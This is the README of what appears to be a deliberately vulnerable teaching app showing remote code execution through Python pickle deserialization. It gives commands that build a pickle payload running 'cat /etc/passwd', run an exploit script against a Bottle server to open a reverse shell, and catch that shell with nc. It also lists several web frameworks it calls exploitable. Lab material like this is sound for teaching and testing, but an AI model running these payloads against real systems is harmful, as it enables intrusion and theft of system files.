# vulnwebapp
Vulnerable Web Application Sample

===

# Python Web Vuln App

Remote code execution with pickle.  


### Code execution with pickle.

example
```
$ cd python
$ python create_pickle_payload.py "cat /etc/passwd" > getpasswd.pickle
$ python -c 'import pickle; pickle.load(open("getpasswd.pickle"))'

```

### Web Framework and pickle

```
$ cd python/bottle
$ python server.py
```

Launch a reverse shell on target server
```
$ cd python
$ python bottle_exploit.py http://localhost:8000/ ThisIsSecretKey
```

```
$ nc localhost 12345

```

You got shell!!

---

You can exploit this vulnerability in the following frameworks

* Bottle
* Werkzeug
* Flask
* Pylons
* Pyramid
* Django


